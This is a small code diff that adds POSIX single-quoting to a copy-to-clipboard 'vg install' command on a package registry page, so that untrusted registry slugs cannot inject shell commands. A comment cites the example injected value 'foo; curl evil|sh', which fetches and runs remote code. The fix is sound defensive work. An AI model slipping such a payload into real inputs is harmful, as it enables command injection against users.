@@ -376,6 +376,17 @@
     return (a === "block" || a === "blur" || a === "log") ? a : "log";
   }
 
+  // Single-quote a string for safe shell paste. The index.json is fetched from
+  // a (possibly third-party / custom) registry and is NOT verified client-side,
+  // so a slug like `foo; curl evil|sh` must not become live shell when the user
+  // clicks Copy and pastes into a terminal. POSIX single-quoting renders any
+  // metacharacter inert; the only escape needed is for a literal single quote
+  // (close-quote, escaped quote, reopen). The one-click vgconfig:// path is
+  // already safe (encodeURIComponent), so this only guards the CLI-copy command.
+  function shellQuote(s) {
+    return "'" + text(s).replace(/'/g, "'\\''") + "'";
+  }
+
   // The registry base this page was served from: its own directory URL (the
   // page lives at the registry root alongside index.json + bundles/). The app's
   // RegistryClient resolves the ref against this same base, so one-click install
@@ -426,7 +437,7 @@
     var versions = Array.isArray(c.versions) ? c.versions : [];
     var latest = versions[0] || {};
     var latestCats = Array.isArray(latest.categories) ? latest.categories : [];
-    var installCmd = "vg install " + text(c.author) + "/" + text(c.slug);
+    var installCmd = "vg install " + shellQuote(text(c.author) + "/" + text(c.slug));
     var appURL = vgconfigURL(c);
 
     var verifiedBadge = c.verified
